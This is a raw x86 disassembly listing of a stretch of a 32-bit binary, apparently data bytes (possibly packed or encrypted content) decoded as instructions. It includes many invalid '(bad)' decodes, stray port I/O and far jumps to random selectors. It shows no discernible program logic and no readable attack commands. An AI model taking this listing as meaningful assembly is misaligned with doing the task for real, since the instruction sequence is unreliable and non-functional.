  4181cc:	dec    ebp
  4181cd:	mov    eax,0x56e6eb54
  4181d2:	loop   0x418219
  4181d4:	mov    DWORD PTR [esi+0xdd8b2a5],0x84d4529f
  4181de:	mov    ecx,0x1ec6a079
  4181e3:	lods   al,BYTE PTR ds:[esi]
  4181e5:	test   BYTE PTR [eax+0x16],0xdb
  4181e9:	inc    eax
  4181ea:	pop    fs
  4181ec:	ffree  st(4)
  4181ee:	mov    ch,0x47
  4181f1:	cmp    al,0xc5
  4181f3:	out    0x21,eax
  4181f5:	jge    0x4181af
  4181f7:	sub    DWORD PTR [esi],0x41
  4181fa:	stc    
  4181fb:	or     BYTE PTR [esi-0x39],0x5e
  4181ff:	enter  0x261,0xde
  418203:	pop    ss
  418204:	mov    bl,0x2f
  418206:	jge    0x4181bc
  418208:	and    esp,DWORD PTR [edx+0x7be8d43d]
  41820e:	bound  esi,QWORD PTR [edi+0x3a6c690d]
  418214:	out    0xc2,al
  418216:	mov    eax,ds:0xa584130c
  41821b:	fs in  al,0x4a
  41821e:	inc    ebp
  41821f:	jmp    0x42be:0x26042765
  418226:	jmp    0x643a:0x8e0633d6
  41822d:	pop    ecx
  41822e:	in     al,dx
  41822f:	leave  
  418230:	pop    edx
  418231:	es aas 
  418233:	std    
  418234:	push   edx
  418235:	push   esp
  418236:	mov    dl,0x42
  418238:	stc    
  418239:	hlt    
  41823a:	fmulp  st(7),st
  41823c:	jecxz  0x418208
  41823e:	inc    esp
  41823f:	add    ebx,ebp
  418241:	jbe    0x41823a
  418243:	sub    al,0xc4
  418245:	pop    edx
  418246:	push   esi
  418247:	(bad)  
  418248:	cmc    
  418249:	pop    ebp
  41824a:	mov    ah,0x26
  41824c:	inc    ebx
  41824d:	adc    eax,0xe502de61
  418252:	repz adc DWORD PTR [esi],eax
  418255:	dec    ebp
  418256:	jp     0x4181e8
  418258:	popa   
  418259:	out    dx,al
  41825a:	mov    edx,DWORD PTR [edx+edx*8-0x58]
  41825e:	in     eax,0xef
  418260:	mov    dh,0x40
  418262:	sti    
  418263:	mov    ebx,0xeb47d0c9
  418268:	les    ecx,FWORD PTR [esi]
  41826a:	sub    BYTE PTR [edi],ah
  41826c:	fs inc ecx
  41826e:	je     0x4182d7
  418270:	xor    al,BYTE PTR [edx+esi*8-0x265af83]
  418277:	test   eax,0xa5a500ad
  41827c:	inc    esp
  41827d:	inc    eax
  41827e:	outs   dx,DWORD PTR ds:[esi]
  41827f:	ins    DWORD PTR es:[edi],dx
  418280:	jecxz  0x418270
  418282:	xlat   BYTE PTR ds:[ebx]
  418283:	cmp    BYTE PTR [eax],0xff
  418286:	arpl   bx,sp
  418288:	jno    0x418254
  41828a:	mov    DWORD PTR [ecx+ebp*8+0x13],ecx
  41828e:	mov    ds:0x712a6d16,eax
  418293:	lods   al,BYTE PTR ds:[esi]
  418294:	ins    DWORD PTR es:[edi],dx
  418295:	xchg   DWORD PTR [ebp-0x8e3d86c],edi
  41829b:	fnsave [ebp+ecx*1-0x4fab2a97]
  4182a2:	daa    
  4182a3:	lds    edx,FWORD PTR [edi]
  4182a5:	iret   
  4182a6:	mov    ?,WORD PTR [ecx+0x2]
  4182a9:	and    DWORD PTR [ecx+0x28],esp
  4182ac:	add    ecx,DWORD PTR [ebx+0x23446980]
  4182b2:	pop    edi
  4182b3:	ja     0x4182ed
  4182b5:	lahf   
  4182b6:	adc    esp,esp
  4182b8:	xchg   edi,eax
  4182b9:	sub    DWORD PTR [edi-0x61],ebp
  4182bc:	xchg   BYTE PTR ds:0xc104d635,dh
  4182c2:	cmp    BYTE PTR ds:0x74f4cc46,cl
  4182c8:	test   ebx,0x512845ae
  4182ce:	gs sahf 
  4182d0:	retf   
  4182d1:	pop    esp
  4182d2:	mov    dl,0xd8
  4182d4:	retf   
  4182d5:	loope  0x4182eb
  4182d7:	(bad)  
  4182d8:	call   0x9fc6:0x1c2f3367
  4182df:	es sbb al,0xff
  4182e2:	dec    ebp
  4182e3:	push   ebx
  4182e4:	iret   
  4182e5:	(bad)  
  4182e6:	adc    eax,DWORD PTR [edi]
  4182e8:	ins    BYTE PTR es:[edi],dx
  4182e9:	inc    esp
  4182ea:	pop    ss
  4182eb:	sbb    eax,0xbde6ad12
  4182f0:	inc    esi
  4182f1:	cmp    esp,esi
  4182f3:	mov    ds:0xa2312019,al
  4182f8:	out    dx,al
  4182f9:	jno    0x41830a
  4182fb:	push   ecx
  4182fc:	repnz sub cl,bl
  4182ff:	mov    al,0xf5
  418301:	aad    0x3a
  418303:	jb     0x4182c8
  418305:	push   ecx
  418306:	adc    dl,dh
  418308:	test   BYTE PTR [ecx+0x4a4eca],bl
  41830e:	and    DWORD PTR [ebx+0x35],0x86d9a61e
  418315:	loope  0x4182e7
  418317:	mov    edi,DWORD PTR [ecx+0x6d]
  41831a:	adc    cl,dl
  41831c:	adc    eax,0x50f0b630
  418321:	push   ecx
  418322:	(bad)
  418325:	fisttp QWORD PTR es:[eax+0x19aa2fa7]
  41832c:	adc    eax,0x6b50937b
  418331:	pop    esi
  418332:	inc    esp
  418333:	std    
  418334:	mov    bh,0x4f
  418336:	push   edi
  418337:	pop    edi
  418338:	hlt    
  418339:	mov    bh,0x6b
  41833b:	jo     0x418371
  41833d:	popf   
  41833e:	into   
  41833f:	shl    ah,0x8a
  418342:	arpl   WORD PTR [ebx],sp
  418344:	sti    
  418345:	add    bl,BYTE PTR [edx]
  418347:	frstor [esi-0x41444c36]
  41834d:	mov    bh,0x3e
  41834f:	retf   0x5ddb
  418352:	je     0x418343
  418354:	mov    eax,ds:0xeadbafd5
  418359:	sub    BYTE PTR ds:0x246709f9,0xd4
  418360:	aam    0x84
  418362:	xchg   ebx,eax
  418363:	icebp  
  418364:	pop    ds
  418365:	arpl   WORD PTR [ecx-0x832066a],dx
  41836b:	add    BYTE PTR [eax],al
  41836d:	pop    edi
  41836e:	psrlw  mm4,QWORD PTR [edi-0x77]
  418372:	or     ebx,esp
  418374:	inc    ebp
  418375:	jne    0x418323
  418377:	and    edx,DWORD PTR [edx-0x974b470]
  41837d:	push   eax
  41837e:	je     0x4183c1
  418380:	mov    dl,BYTE PTR [esp+eax*4+0x67]
  418384:	cmp    eax,0xbd0976d
  418389:	popf   
  41838a:	dec    ebx
  41838b:	(bad)  
  41838c:	mov    eax,ds:0x8b7b16c3
  418391:	mov    cl,0xa6
  418393:	jbe    0x41838f
  418395:	fisttp DWORD PTR [ecx]
  418397:	push   es
  418398:	sub    eax,0xfefc5f29
  41839d:	push   ss
  41839e:	inc    edi
  41839f:	test   BYTE PTR [eax+0x7a844152],cl
  4183a5:	std    
  4183a6:	neg    BYTE PTR [eax+0x71]
  4183a9:	push   ecx
  4183aa:	ret    
  4183ab:	xor    eax,0x2a0444a6
  4183b0:	pop    edi
  4183b1:	add    DWORD PTR [ecx],0x33
  4183b4:	add    esi,edi
  4183b6:	int3   
  4183b7:	adc    eax,0x87f70e91
  4183bc:	pop    edi
  4183bd:	enter  0x755e,0x89
  4183c1:	xor    eax,0xf9978eb3
  4183c6:	sbb    al,0x11
  4183c8:	clc    
  4183c9:	mov    al,0xf
  4183cb:	scas   eax,DWORD PTR es:[edi]
  4183cc:	in     eax,0x33
  4183ce:	pop    ss
  4183cf:	(bad)  
  4183d0:	mov    esp,0x4994ac04
  4183d5:	and    bl,ch
  4183d7:	mov    eax,0xd34f0080
  4183dc:	mov    al,dl
  4183de:	aaa    
  4183df:	ret    
  4183e0:	lods   al,BYTE PTR ds:[esi]
  4183e1:	push   ss
  4183e2:	lds    esi,FWORD PTR [ecx-0x1c061a05]
  4183e8:	mov    ds:0x165cbf9d,eax
  4183ed:	lds    eax,FWORD PTR [edx+0x2c5fc037]
  4183f3:	lods   eax,DWORD PTR ds:[esi]
  4183f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183f5:	push   edx
  4183f6:	das    
  4183f7:	or     al,0x44
  4183f9:	add    DWORD PTR [eax+0x3b],eax
  4183fc:	sub    dh,BYTE PTR [edx]
  4183fe:	fmulp  st(2),st
  418400:	or     esi,edx
  418402:	nop
  418403:	mov    al,ds:0xb0fede43
  418408:	and    al,0xd0
  41840a:	dec    esp
  41840b:	jge    0x4183ca
  41840d:	jmp    0x868b:0x6b4613de
  418414:	in     eax,dx
  418415:	cmp    ch,BYTE PTR [esi-0x57]
  418418:	aaa    
  418419:	sub    DWORD PTR ds:[esi],ebp
  41841c:	jmp    0x3cc1633
  418421:	and    eax,0x91b5510d
  418426:	pop    edi
  418427:	and    DWORD PTR [ecx+0xb],eax
  41842a:	mov    ds:0x9d20c2aa,eax
  41842f:	fld    TBYTE PTR [ebx]
  418431:	push   0xffffffc7
  418433:	in     al,0xd4
  418435:	cld    
  418436:	jle    0x41843a
  418438:	div    BYTE PTR fs:[esi+0x22cff7a5]
  41843f:	ret    
  418440:	push   ebp
  418441:	jbe    0x41844f
  418443:	std    
  418444:	arpl   WORD PTR [eax+0x39],cx
  418447:	xor    BYTE PTR [ebp+ecx*2+0x5d51e35a],ah
  41844e:	ret    
  41844f:	mov    edi,0x5cf2758e
  418454:	pop    esp
  418455:	outs   dx,BYTE PTR ds:[esi]
  418456:	adc    dl,BYTE PTR [ecx+0x681851ff]
  41845c:	inc    esp
  41845d:	cmp    al,0xa1
  41845f:	int3   
  418460:	sub    DWORD PTR [ebx],esi
  418462:	pusha  
  418463:	out    dx,eax
  418464:	fsubr  st(3),st
  418466:	jge    0x418444
  418468:	or     ch,dh
  41846a:	mov    dl,dl
  41846c:	(bad)  
  41846d:	sub    eax,0xe51f2776
  418472:	pop    es
  418473:	sub    ecx,DWORD PTR [esi+0x1ba6251f]
  418479:	sbb    eax,DWORD PTR [ebp-0x7c]
  41847c:	les    eax,FWORD PTR [esi-0xe]
  41847f:	dec    ecx
  418480:	sbb    DWORD PTR [ecx-0x3e],esi
  418483:	bound  esp,QWORD PTR ds:0x26f39a09
  418489:	(bad)  
  41848b:	loope  0x4184d4
  41848d:	xchg   DWORD PTR [ebx+0x11],ebx
  418490:	mov    esi,0x319c78fb
  418495:	jg     0x41850a
  418497:	leave  
  418498:	and    DWORD PTR [esp+edx*1+0x4d],ecx
  41849c:	cmp    al,0x4f
  41849e:	jb     0x418469
  4184a0:	or     edi,DWORD PTR [ebx]
  4184a2:	push   ds
  4184a3:	mov    esp,0xef58b5cb
  4184a8:	pop    esp
  4184a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184aa:	mov    ah,0xec
  4184ac:	rcl    ecx,1
  4184ae:	inc    DWORD PTR [edx+ebp*1]
  4184b1:	mov    eax,ds:0x5abd9680
  4184b6:	(bad)  
  4184b7:	fdiv   st,st(6)
  4184b9:	lahf   
  4184ba:	cdq    
  4184bb:	jo     0x418532
  4184bd:	and    edi,ebx
  4184bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184c0:	pop    ebx
  4184c1:	imul   esp,DWORD PTR [ecx+edi*8+0x72],0x7f
  4184c6:	fisubr WORD PTR [esi]
  4184c8:	inc    ecx
  4184c9:	add    BYTE PTR [ecx+0x2dec7a09],dl
  4184cf:	ret    
  4184d0:	(bad)  
  4184d2:	js     0x4184af
  4184d4:	dec    ecx
  4184d5:	stc    
  4184d6:	cld    
  4184d7:	addr16 xchg ecx,eax
  4184d9:	fst    QWORD PTR [esi-0x3773e51]
  4184df:	xor    BYTE PTR es:[ecx],bh
  4184e2:	cdq    
  4184e3:	rcl    DWORD PTR [ebx-0x1927ed95],1
  4184e9:	mov    dl,0x1
  4184eb:	inc    ebx
  4184ec:	scas   eax,DWORD PTR es:[edi]
  4184ed:	or     ch,BYTE PTR [ebp+0x2c]
  4184f0:	adc    esp,DWORD PTR [eax]
  4184f2:	sbb    BYTE PTR [edi],cl
  4184f4:	cs fwait
  4184f6:	mov    edx,0x8a80775f
  4184fb:	adc    ecx,edx
  4184fd:	sub    eax,ebx
  4184ff:	push   ss
  418500:	jmp    0xf909:0x21e0b2e4
  418507:	mov    cl,ch
  418509:	je     0x418524
  41850b:	push   ss
  41850c:	dec    ecx
  41850d:	ret    
  41850e:	call   0xcfcf:0xc8e852a5
  418515:	push   es
  418516:	fnstsw WORD PTR [ecx-0x76]
  418519:	pop    esi
  41851a:	jb     0x418521
  41851c:	das    
  41851d:	pushf  
  41851e:	xchg   ebx,eax
  41851f:	sbb    DWORD PTR [esi+0x44],edi
  418522:	jne    0x4184cb
  418524:	retf   
  418525:	out    0x14,al
  418527:	imul   edi,edx,0xd746d3e0
  41852d:	pusha  
  41852e:	ins    DWORD PTR es:[edi],dx
  41852f:	loopne 0x4185a7
  418531:	sub    BYTE PTR [ecx+0x456c6142],ch
  418537:	dec    esi
  418538:	rcl    DWORD PTR [ebp-0x1d],cl
  41853b:	out    0xac,al
  41853d:	mov    ch,0x97
  41853f:	xchg   esi,eax
  418540:	cmc    
  418541:	aaa    
  418542:	test   al,0xd4
  418544:	push   0x61ec0131
  418549:	inc    edi
  41854a:	ds pop ss
  41854c:	jne    0x4185ba
  41854e:	mov    esp,0x10952fa0
  418553:	pusha  
  418554:	pop    ecx
  418555:	pop    esi
  418556:	push   es
  418557:	clc    
  418558:	fimul  DWORD PTR [eax*8-0x1eecd0c4]
  41855f:	push   ss
  418560:	pop    edi
  418561:	ins    DWORD PTR es:[edi],dx
  418562:	retf   0xd340
  418565:	pop    esi
  418566:	push   0x822eb5c2
  41856b:	shl    BYTE PTR [edx],cl
  41856d:	ja     0x41858b
  41856f:	adc    ecx,edi
  418571:	adc    al,0x1
  418573:	dec    esi
  418574:	(bad)  
  418575:	xor    DWORD PTR gs:[ebx],ecx
  418578:	fs cmc 
  41857a:	push   ss
  41857b:	dec    edi
  41857c:	icebp  
  41857d:	icebp  
  41857e:	pop    esi
  41857f:	push   ecx
  418580:	adc    eax,0xb83a24e1
  418585:	mov    eax,0x6744376a
  41858a:	xchg   BYTE PTR [edi+eiz*2],bh
  41858d:	retf   
  41858e:	pushf  
  41858f:	lods   eax,DWORD PTR ds:[esi]
  418590:	and    cl,0xd7
  418593:	leave  
  418594:	dec    edi
  418595:	pop    eax
  418596:	retf   
  418597:	test   DWORD PTR [edx+0x408ed3e6],ebx
  41859d:	lods   al,BYTE PTR ds:[esi]
  41859e:	mov    ds:0x882f0ce0,eax
  4185a3:	dec    ebx
  4185a4:	outs   dx,DWORD PTR ds:[esi]
  4185a5:	cmp    al,0xd8
  4185a7:	loope  0x418590
  4185a9:	(bad)  
  4185aa:	cmc    
  4185ab:	mov    al,ds:0xb880867a
  4185b0:	push   esp
  4185b1:	xchg   ebp,eax
  4185b2:	aam    0x82
  4185b4:	push   ds
  4185b5:	test   cl,dh
  4185b7:	int    0xf
  4185b9:	dec    esi
  4185ba:	stos   BYTE PTR es:[edi],al
  4185bb:	cli    
  4185bc:	dec    edi
  4185bd:	dec    ebp
  4185be:	sub    al,0x51
  4185c0:	pop    ebx
  4185c1:	xchg   edx,eax
  4185c2:	daa    
  4185c3:	ins    DWORD PTR es:[edi],dx
  4185c4:	fistp  QWORD PTR [ebp-0x3b]
  4185c7:	out    dx,al
  4185c8:	mov    bl,0x32
  4185ca:	push   ds
  4185cb:	cld    
  4185cc:	push   edi
  4185cd:	cdq    
  4185ce:	dec    ebp
  4185cf:	sbb    dh,BYTE PTR [ebp-0x4c]
  4185d2:	cdq    
  4185d3:	mov    ebp,0x7152fad
  4185d8:	sahf   
  4185d9:	push   0xffffffac
  4185db:	and    DWORD PTR [eax],ecx
  4185dd:	stos   BYTE PTR es:[edi],al
  4185de:	jno    0x418589
  4185e0:	stc    
  4185e1:	data16 and al,BYTE PTR [edi+0x74]
  4185e5:	pop    ss
  4185e6:	popa   
  4185e7:	shl    BYTE PTR [esi],1
  4185e9:	mov    ch,0x34
  4185eb:	sbb    al,0x97
  4185ed:	sbb    ebx,esi
  4185ef:	mov    al,0xe8
  4185f1:	and    al,0x60
  4185f3:	or     ah,bh
  4185f5:	(bad)  
  4185f6:	stc    
  4185f7:	popf   
  4185f8:	in     al,dx
  4185f9:	and    BYTE PTR [ebx-0x11],bl
  4185fc:	js     0x418653
  4185fe:	and    ebx,DWORD PTR [ebp+0x64c5793d]
  418604:	out    dx,eax
  418605:	call   0xd705:0xb08cf7b4
  41860c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41860d:	leave  
  41860e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41860f:	or     eax,0xf380dd64
  418614:	outs   dx,DWORD PTR ds:[esi]
  418615:	pusha  
  418616:	push   ebx
  418617:	jl     0x41860f
  418619:	aaa    
  41861a:	pop    ds
  41861b:	jbe    0x41866e
  41861d:	jnp    0x4185d9
  41861f:	or     al,0x92
  418621:	enter  0x7af6,0xc0
  418625:	int3   
  418626:	sar    BYTE PTR [esi],0xfc
  418629:	das    
  41862a:	popf   
  41862b:	mov    ah,BYTE PTR [ebp-0x26]
  41862e:	push   esi
  41862f:	sbb    BYTE PTR [edi-0x4b476a0e],bl
  418635:	iret   
  418636:	out    0x1c,al
  418638:	dec    ebx
  418639:	lods   al,BYTE PTR ds:[esi]
  41863a:	sub    eax,0xeb45f588
  41863f:	lods   al,BYTE PTR ds:[esi]
  418640:	stos   DWORD PTR es:[edi],eax
  418641:	sbb    ch,BYTE PTR [edi]
  418643:	imul   ebp
  418645:	(bad)  
  418646:	cmp    cl,BYTE PTR [esi]
  418648:	push   esi
  418649:	cli    
  41864a:	xor    bh,bl
  41864c:	or     eax,0x55ec44e5
  418651:	inc    esi
  418652:	jnp    0x418633
  418654:	aas    
  418655:	inc    ecx
  418656:	pop    eax
  418657:	mov    dl,0x6f
  418659:	sbb    cl,BYTE PTR [ecx+0x32]
  41865c:	mov    ebx,DWORD PTR [edi+0x723b4940]
  418662:	dec    DWORD PTR [ecx]
  418664:	xor    ebp,DWORD PTR [edi]
  418666:	sahf   
  418667:	jg     0x4185f0
  418669:	mov    ds:0x7ee428bf,al
  41866e:	add    esp,ebp
  418670:	jg     0x4186c3
  418672:	cld    
  418673:	xchg   DWORD PTR [ebp+eiz*2-0x1e3a2cc3],ebx
  41867a:	mov    ecx,0x10a7a373
  41867f:	mov    ebx,0x8ed2956f
  418684:	xor    dl,BYTE PTR ds:0xb106aed7
  41868a:	dec    ecx
  41868b:	in     al,dx
  41868c:	aas    
  41868d:	int    0x2b
  41868f:	push   cs
  418690:	cmp    eax,0xea63336c
  418695:	jmp    0x418679
  418697:	out    0x73,al
  418699:	retf   0x715e
  41869c:	les    edx,FWORD PTR [eax-0x5c5d2e7]
  4186a2:	jl     0x418684
  4186a4:	xchg   ebx,eax
  4186a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186a6:	loopne 0x418640
  4186a8:	out    dx,eax
  4186a9:	loope  0x41869c
  4186ab:	lock clc 
  4186ad:	ret    
  4186ae:	mov    cl,0x50
  4186b0:	repnz iret 
  4186b2:	cli    
  4186b3:	lgs    edx,FWORD PTR [ebx-0x6f]
  4186b7:	ror    DWORD PTR [ebp+0x2dee5d99],1
  4186bd:	aas    
  4186be:	popf   
  4186bf:	(bad)  
  4186c0:	hlt    
  4186c1:	jne    0x41871b
  4186c3:	jmp    0x2431:0x157a002
  4186ca:	retf   0x43a6
  4186cd:	loopne 0x4186a5
  4186cf:	out    dx,al
  4186d0:	call   0xd42dcc5f
  4186d5:	xor    bh,BYTE PTR [eax-0x7e]
  4186d8:	daa    
  4186d9:	clc    
  4186da:	cmp    eax,DWORD PTR [esi+0x75]
  4186dd:	cdq    
  4186de:	push   ebp
  4186df:	retf   0x2c69
  4186e2:	sbb    al,0xe4
  4186e4:	mov    al,0x8e
  4186e6:	mov    al,ds:0x167c247
  4186eb:	cmp    cl,0x87
  4186ee:	xchg   edx,eax
  4186ef:	jnp    0x418706
  4186f1:	pop    ebp
  4186f2:	push   edi
  4186f3:	fisubr DWORD PTR [ebx-0x11]
  4186f6:	(bad)  
  4186f7:	and    DWORD PTR [esi],ecx
  4186f9:	scas   al,BYTE PTR es:[edi]
  4186fa:	mov    al,0xfe
  4186fc:	pop    esp
  4186fd:	pop    ds
  4186fe:	push   esi
  4186ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418700:	adc    eax,edi
  418702:	in     eax,dx
  418703:	call   0xc4d26ee7
  418708:	xor    al,0xe5
  41870a:	imul   ebx,DWORD PTR [eax],0x5d
  41870d:	outs   dx,BYTE PTR ds:[esi]
  41870e:	jmp    0x418707
  418710:	xor    eax,eax
  418712:	sub    eax,0x9325f520
  418717:	push   esp
  418718:	test   al,0x34
  41871a:	fisttp WORD PTR [esi]
  41871c:	adc    DWORD PTR [ecx+0x1c1af057],ebx
  418722:	inc    esi
  418723:	ret    
  418724:	mov    al,ds:0x5e6afff3
  418729:	das    
  41872a:	outs   dx,DWORD PTR ds:[esi]
  41872b:	lea    eax,[edi-0x59]
  41872e:	cs in  ax,0x66
  418732:	jo     0x4187a3
  418734:	jle    0x4186c5
  418736:	fcomp  DWORD PTR [ebx+0x780617b7]
  41873c:	mov    ecx,0xb3bccfaa
  418741:	add    BYTE PTR [esi+0x7a50df86],al
  418747:	jns    0x4186d8
  418749:	ins    BYTE PTR es:[edi],dx
  41874a:	call   0x7598890
  41874f:	stc    
  418750:	inc    eax
  418751:	pop    ss
  418752:	fsubr  QWORD PTR [esi+0x5744f632]
  418758:	jne    0x418757
  41875a:	sub    bh,BYTE PTR [ebx]
  41875c:	cmp    al,0x16
  41875e:	push   es
  41875f:	fcom   QWORD PTR [ebx+0x10]
  418762:	mov    eax,ds:0xce60c344
  418767:	jecxz  0x418701
  418769:	into   
  41876a:	repz in al,0x53
  41876d:	ds pop es
  41876f:	jmp    0x9e8a:0x30ec3b67
  418776:	lds    ebx,FWORD PTR [edi-0x37563753]
  41877c:	leave  
  41877d:	or     DWORD PTR [ebx-0x3e],edi
  418780:	dec    ecx
  418781:	mov    eax,ds:0x424062a7
  418786:	or     dl,ch
  418788:	hlt    
  418789:	cs mov cl,0xfc
  41878c:	jno    0x418777
  41878e:	test   DWORD PTR [ebx+0x44136ebf],0x2dbec366
  418798:	inc    ebx
  418799:	jge    0x41874d
  41879b:	mov    ch,0x45
  41879d:	inc    esp
  41879e:	xchg   edx,eax
  41879f:	cmp    DWORD PTR [ebp-0x55818377],edx
  4187a5:	cwde   
  4187a6:	xchg   ecx,eax
  4187a7:	cmp    DWORD PTR [edx-0x7c],esi
  4187aa:	mov    esp,0x95726077
  4187af:	inc    ecx
  4187b0:	repz lds esp,FWORD PTR [edx-0x3e1e23c0]
  4187b7:	pop    ebx
  4187b8:	cli    
  4187b9:	in     eax,dx
  4187ba:	leave  
  4187bb:	sub    al,0x8c
  4187bd:	inc    ecx
  4187be:	cmp    DWORD PTR [edi],esp
  4187c0:	addr16 pop edi
  4187c2:	outs   dx,BYTE PTR ds:[esi]
  4187c3:	mov    cl,0xa1
  4187c5:	rol    BYTE PTR [ecx-0x2f],0x4
  4187c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187ca:	cmp    dh,BYTE PTR [eax+ebx*8-0x2ab36386]
  4187d1:	stos   DWORD PTR es:[edi],eax
  4187d2:	ins    DWORD PTR es:[edi],dx
  4187d3:	xor    DWORD PTR [ebp-0x7de90c70],esp
  4187d9:	pushf  
  4187da:	fnstcw WORD PTR [esi+0x7b]
  4187dd:	jmp    0xcaff92f
  4187e2:	pop    eax
  4187e3:	xor    BYTE PTR [ecx+0x3995dec6],0x49
  4187ea:	sub    dh,BYTE PTR [ebx]
  4187ec:	dec    esp
  4187ed:	xchg   edi,eax
  4187ee:	in     al,0x9e
  4187f0:	xor    eax,0x9509b5f9
  4187f5:	loop   0x4187c2
  4187f7:	dec    ebx
  4187f8:	xor    ecx,esi
  4187fa:	add    eax,0xc3ec3dd8
  4187ff:	in     eax,0xaa
  418801:	sti    
  418802:	jle    0x41887b
  418804:	adc    BYTE PTR [ecx],bh
  418806:	xor    eax,0xfe05744e
  41880b:	pushf  
  41880c:	mov    bh,0x95
  41880e:	icebp  
  41880f:	mov    WORD PTR [edx+0x5c798fb],gs
  418815:	ins    DWORD PTR es:[edi],dx
  418816:	xchg   ebp,eax
  418817:	inc    esi
  418818:	iret   
  418819:	icebp  
  41881a:	rcr    BYTE PTR [edx-0x4380ddf],cl
  418820:	cmp    dh,BYTE PTR [eax+0x6eb36d28]
  418826:	sub    DWORD PTR [ebp+0x4d],esi
  418829:	mov    BYTE PTR [edx+ebp*8-0x9],ah
  41882d:	cmp    eax,0x2b8ada88
  418832:	bound  edx,QWORD PTR [esi]
  418834:	das    
  418835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418836:	or     al,0xd3
  418838:	je     0x4187eb
  41883a:	fdiv   DWORD PTR [ebx+0x5e]
  41883d:	or     BYTE PTR [esi],cl
  41883f:	and    cl,ah
  418841:	rcr    BYTE PTR [esi+ecx*2-0x4e1deb9f],cl
  418848:	mov    al,0x27
  41884a:	scas   eax,DWORD PTR es:[edi]
  41884b:	pop    ds
  41884c:	or     DWORD PTR [ecx],ebp
  41884e:	(bad)  
  41884f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  418851:	xor    bh,BYTE PTR [esi+edi*1]
  418854:	dec    eax
  418855:	fdivr  DWORD PTR [ebp+0x36]
  418858:	mov    cl,0xf8
  41885a:	mov    ebp,0xb23d31a2
  41885f:	loop   0x4187f8
  418861:	mov    bh,0x64
  418863:	push   ebx
  418864:	clc    
  418865:	(bad)  
  418866:	les    ecx,FWORD PTR [ecx]
  418868:	or     eax,0xba419eee
  41886d:	xchg   dh,bl
  41886f:	push   es
  418870:	xor    DWORD PTR [ecx],ebp
  418872:	shr    BYTE PTR [ecx+0x6a],cl
  418875:	fwait
  418876:	call   0xf439e9c9
  41887b:	nop
  41887c:	out    0x1a,eax
  41887e:	and    eax,0x3f1da1f1
  418883:	das    
  418884:	and    al,0xd5
  418886:	ja     0x418885
  418888:	aad    0x4c
  41888a:	dec    esp
  41888b:	ret    0x72d8
  41888e:	jns    0x4188c1
  418890:	loopne 0x418878
  418892:	mov    ds:0x359dfc5f,al
  418897:	push   ss
  418898:	outs   dx,BYTE PTR ds:[esi]
  418899:	jno    0x418909
  41889b:	dec    eax
  41889c:	fcom   DWORD PTR [edi+0x667ccad2]
  4188a2:	inc    ebx
  4188a3:	sub    eax,0x2a55186a
  4188a8:	sbb    al,0x44
  4188aa:	adc    eax,ebp
  4188ac:	xor    DWORD PTR [ecx+0x18adfa68],edi
  4188b2:	int    0x2b
  4188b4:	push   edx
  4188b5:	pop    ds
  4188b6:	mov    DWORD PTR [edi+0xba02eff],ebp
  4188bc:	adc    DWORD PTR [ecx+0x79f02186],esp
  4188c2:	mov    ebx,0x4927215
  4188c7:	xor    DWORD PTR [ebp-0x67],edx
  4188ca:	scas   al,BYTE PTR es:[edi]
  4188cb:	mov    edx,0xf7a19c6c
  4188d0:	mov    esp,0xfac904d7
  4188d5:	sub    al,0x99
  4188d7:	pop    es
  4188d8:	mov    edi,0x271da861
  4188dd:	lds    ebp,FWORD PTR [esi-0x41]
  4188e0:	mov    eax,ds:0x7e6a72cd
  4188e5:	mov    WORD PTR [edx],ss
  4188e7:	and    BYTE PTR [esp+esi*2+0x3d],ah
  4188eb:	sub    esp,DWORD PTR [edx+0x2eaf7b3d]
  4188f1:	lea    edx,ds:0x2cbf717f
  4188f7:	mov    dh,dh
  4188f9:	cmp    ah,BYTE PTR [esi+esi*1]
  4188fc:	scas   eax,DWORD PTR es:[edi]
  4188fd:	mov    edx,0xa468e416
  418902:	or     al,0xcc
  418904:	jb     0x4188b6
  418906:	in     al,dx
  418907:	je     0x4188ba
  418909:	sub    cl,BYTE PTR [ebp-0x4b]
  41890c:	and    eax,0x200631f5
  418911:	dec    ebp
  418912:	pop    ss
  418913:	pop    ss
  418914:	mov    ch,0x28
  418916:	sbb    eax,0x51e8e2b6
  41891b:	push   ebx
  41891c:	fs loop 0x41897f
  41891f:	mov    ds:0xa9f69e79,eax
  418924:	sbb    cl,BYTE PTR [ebx+0x7857e4a5]
  41892a:	nop
  41892b:	jl     0x4188d8
  41892d:	stc    
  41892e:	inc    esi
  41892f:	call   0xcb3a94c0
  418934:	pop    eax
  418935:	pop    eax
  418936:	inc    esi
  418937:	jmp    0x7c34f72b
  41893c:	and    BYTE PTR [esi],dl
  41893e:	inc    edx
  41893f:	rcl    BYTE PTR [eax-0x71],1
  418942:	sbb    al,BYTE PTR [ebx-0x28]
  418945:	add    DWORD PTR [ecx],ebx
  418947:	mov    esi,0x6be58320
  41894c:	jle    0x4188d5
  41894e:	jae    0x418918
  418950:	mov    al,0x1d
  418952:	inc    ebx
  418953:	outs   dx,BYTE PTR ds:[esi]
  418954:	xchg   ebx,eax
  418955:	test   al,0x7c
  418957:	loope  0x418967
  418959:	test   ecx,esp
  41895b:	fs stos DWORD PTR es:[edi],eax
  41895d:	and    BYTE PTR [ebx],0xae
  418960:	cmp    ebx,eax
  418962:	add    ah,cl
  418964:	test   DWORD PTR ds:0xfdacd4b9,ecx
  41896a:	pop    es
  41896b:	fnsave [eax-0x11]
  41896e:	mov    dl,0x8c
  418970:	jb     0x4189c0
  418972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418973:	inc    ecx
  418974:	es mov esi,esp
  418977:	imul   eax,DWORD PTR cs:[ecx+edx*8],0x7f7d81a9
  41897f:	lods   eax,DWORD PTR ds:[esi]
  418980:	mov    ebx,0x23e240ef
  418985:	aaa    
  418986:	fld    TBYTE PTR [ebx+0x1b]
  418989:	or     bh,BYTE PTR [eax+0x1aa26a2c]
  41898f:	mov    eax,0xe4e24d06
  418994:	mov    bl,0xb1
